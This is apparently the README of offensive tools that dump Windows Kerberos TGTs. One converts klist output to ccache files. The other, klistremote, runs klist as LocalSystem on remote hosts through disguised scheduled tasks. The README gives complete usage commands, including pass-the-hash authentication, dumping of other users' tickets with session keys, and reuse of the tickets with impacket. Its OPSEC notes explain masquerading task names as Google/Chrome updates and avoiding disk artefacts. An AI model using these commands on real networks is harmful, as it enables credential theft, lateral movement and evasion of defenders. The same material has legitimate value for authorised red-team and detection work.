# klist

Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that binary's output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely: it connects to a Windows host, runs `klist sessions` and `klist tgt -li <id>` via **Task Scheduler**, and writes ccache files locally.

---

## klist2ccache

Use this when you already have `klist` output (e.g. from a shell on the target or from copied text).

List sessions:
```cmd
C:\Windows\System32>klist sessions

Current LogonId is 0:0x3e7
[0] Session 1 0:0x15d6ed LUMON\jotter Negotiate:Interactive
[1] Session 1 0:0x154333 LUMON\jotter Kerberos:Interactive
[2] Session 0 0:0x3e5 NT AUTHORITY\LOCAL SERVICE Negotiate:Service
[3] Session 1 0:0x11ad7 Window Manager\DWM-1 Negotiate:Interactive
[4] Session 1 0:0x11a78 Window Manager\DWM-1 Negotiate:Interactive
[5] Session 0 0:0x3e4 LUMON\jotter-pc$ Negotiate:Service
[6] Session 1 0:0xb248 Font Driver Host\UMFD-1 Negotiate:Interactive
[7] Session 0 0:0xb23d Font Driver Host\UMFD-0 Negotiate:Interactive
[8] Session 0 0:0xa748 \ NTLM:(0)
[9] Session 0 0:0x3e7 LUMON\jotter-pc$ Negotiate:(0)
```
Dump ticket (session key will be zeroed with improper perms):
```cmd
C:\Windows\System32>klist tgt -li 0x154333

Current LogonId is 0:0x3e7
Targeted LogonId is 0:0x154333

Cached TGT:

ServiceName        : krbtgt
TargetName (SPN)   : krbtgt
ClientName         : jotter
DomainName         : LUMON.COM
TargetDomainName   : LUMON.COM
AltTargetDomainName: LUMON.COM
Ticket Flags       : 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 32 - 80 31 1f 9e d7 f9 6c 0f 6a 67 18 c1 8d 12 1a ec fd b4 68 21 39 99 f3 9b 89 74 58 c9 94 87 e6 ba
StartTime          : 3/6/2026 19:07:09 (local)
EndTime            : 3/7/2026 5:07:09 (local)
RenewUntil         : 3/13/2026 9:22:16 (local)
TimeSkew           :  - 0:05 minute(s)
EncodedTicket      : (size: 1162)
0000  61 82 04 86 30 82 04 82:a0 03 02 01 05 a1 0c 1b  a...0...........
<SNIP>
```

Copy the stdout of `klist tgt` and feed to script:

```bash
python klist2ccache.py -i tgt.txt

[*] Parsed ticket:
    client     : JOTTER-PC$@LUMON.COM
    server     : krbtgt/LUMON.COM@LUMON.COM
    key_type   : 18
    key        : 74f62dc212216c910b<SNIP>dc964137c70fb8f476b22852db398
    flags      : 0x40e10000
    start_time : 2026-03-06 17:44:00+00:00
    end_time   : 2026-03-07 03:44:00+00:00
    renew_till : 2026-03-13 08:13:41+00:00
    ticket     : 1229 bytes

[+] ccache written → JOTTER-PC$@LUMON.COM.ccache  (1450 bytes)

[*] Use with impacket:
    export KRB5CCNAME=JOTTER-PC$@LUMON.COM.ccache
    smbclient.py -k -no-pass <domain>/<user>@<target>
```

---

## klistremote

Use this when you have credentials to a Windows host and want to dump TGTs from that host without an interactive shell. Same auth and target format as other Impacket tools (e.g. `atexec`, `smbclient`).

By default, command output is written to a temp file under `C:\ProgramData\` on the target, read via `C$`, then deleted. Use **`-named-pipes`** (or the **klistpipes** launcher) to stream output via a PowerShell named pipe over SMB IPC$ instead — no files on disk.

| Mode           | Output        | RPC pipe      | Detail |
|----------------|---------------|---------------|--------|
| Default        | File          | `\pipe\atsvc` | Task runs `cmd.exe`; file written to `C:\ProgramData\`, read via C$, deleted |
| `-named-pipes` | Named pipe    | `\pipe\atsvc` | Task runs PowerShell pipe server; output streamed over IPC$, nothing on disk |

### What it does

1. **Connects** to the target over SMB + Task Scheduler RPC (`\pipe\atsvc`).
2. **Runs `klist sessions`** as **LocalSystem** via a scheduled task. Output is either a temp file (read via `C$`, then deleted) or a named pipe over IPC$ (with `-named-pipes`).
3. **Filters sessions**: keeps every Kerberos logon **except** `Kerberos:Network`.
4. **Dumps TGTs**: in default mode, all `klist tgt -li` calls are batched into one task; in `-named-pipes` mode, everything runs in a single task.
5. **Parses** each `klist tgt` output and **writes** one MIT ccache file per TGT locally.

Because execution runs as LocalSystem, session keys are present (no zeroed keys like when running `klist` as a normal user).

### Requirements

- Credentials that can authenticate to the target (password, NTLM hash, or Kerberos).
- Ability to create/run/delete scheduled tasks and (default mode) read/delete files under `C$` — same as `atexec`.
- Target Windows Vista or later. With `-named-pipes`, PowerShell 2.0+ is required.

### Modes

**`list`** — Enumerate active Kerberos sessions and print them with their index numbers. No TGTs are retrieved.

**`dump`** — Dump TGTs for all sessions (or a single session by number from `list`) and write ccache files locally.

### Usage

```bash
# List Kerberos sessions on target
python klistremote.py list domain/user@target
python klistremote.py list -hashes :NTHASH user@target

# Stream output via named pipe (no files on disk)
python klistremote.py list -named-pipes -hashes :NTHASH user@target
python klistpipes.py list -hashes :NTHASH user@target        # convenience launcher

# Dump all sessions
python klistremote.py dump domain/user@target
python klistremote.py dump -hashes :NTHASH user@target -o ./ccaches

# Dump with named pipes (no files on disk)
python klistremote.py dump -named-pipes domain/user@target -o ./ccaches

# Dump a single session by number (1-based, from list output)
python klistremote.py dump domain/user@target -s 2
python klistremote.py dump -hashes :NTHASH user@target -s 1 -o ./ccaches

# Kerberos auth
python klistremote.py list -k user@target
python klistremote.py dump -k user@target
```

Example — list sessions first, then dump a specific one:

```
$ python klistremote.py list LUMON/admin@10.10.10.5
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Connecting to 10.10.10.5 ...
[*] Enumerating remote Kerberos sessions ...
[*]   task: \ChromeUpdater  file: ChromeUpdater_48291.dat

  Kerberos sessions on 10.10.10.5:

  [1]  LUMON\jotter     0x154333
  [2]  LUMON\jotter-pc$ 0x3e4

$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Connecting to 10.10.10.5 ...
[*] Enumerating remote Kerberos sessions ...
[*]   task: \ChromeManager  file: ChromeManager_71053.log

  Sessions to dump:

  [1]  LUMON\jotter  0x154333

[*] Dumping 1 TGT(s) in one task ...
[*]   task: \ChromeCollector  file: ChromeCollector_92714.log
[*] [1/1] LUMON\jotter (0x154333) ...
[*]   -> ./ccaches/jotter@LUMON.COM.ccache
[*] Done. 1 ccache(s) written to ./ccaches
```

```bash
export KRB5CCNAME=./ccaches/jotter@LUMON.COM.ccache
impacket-smbclient -k -no-pass LUMON/jotter@target
```

### OPSEC considerations

- **Task Scheduler** — Creates, runs, and deletes one task for `list`; two tasks for `dump` (sessions + all TGTs batched). Task names, authors, and descriptions are randomised product/company word pairs (e.g. `ChromeUpdater`, author `Google LLC`). All tasks in a single `dump` run share the same product name. EDR, 4688/4698, Sysmon, or policies that flag scheduled task activity will still see it.
- **RPC/SMB** — Always uses `\pipe\atsvc` (Task Scheduler). RPC auth with PKT_PRIVACY. Same detection surface as `atexec`.
- **Default (file)** — Output written to `C:\ProgramData\<randomname>` via `cmd.exe`, read via `C$`, then deleted. Process/CLI logging will show `cmd.exe` → `klist`.
- **`-named-pipes`** — No files on disk. `list` uses one task; `dump` uses one task for everything. Tasks run `powershell.exe -EncodedCommand <base64>`; output streamed over a named pipe on SMB IPC$. The pipe exists only while the process runs. PowerShell script block logging (4104) and AMSI can still decode the command if enabled.
- **Credential theft** — Exports TGTs (with keys) for other users; treat as high-sensitivity.

### klistpipes launcher

**klistpipes.py** is a convenience launcher that runs klistremote with `-named-pipes` (same argv otherwise). Use it if you prefer the old command name:

```bash
python klistpipes.py list domain/user@target
python klistpipes.py dump -hashes :NTHASH user@target -o ./ccaches
```

---

## Troubleshooting

**`KRB_AP_ERR_BAD_INTEGRITY`**  
Session key is wrong. Make sure you ran `klist` as SYSTEM with `-li`. (With klistremote, the task runs as LocalSystem so keys are present.)

**`Could not extract ticket bytes`**  
The input doesn't contain the `EncodedTicket` hex dump. Make sure you captured the full output of `klist tgt`, not just `klist`.

**`WARNING: session key is all-zeros`**  
You ran `klist` as a normal user. The key is hidden. Run as SYSTEM (or use klistremote, which does).

**Clock skew errors**
Kerberos requires clocks within 5 minutes. Sync your Linux machine: `sudo ntpdate <dc>` or `sudo timedatectl set-ntp true`.

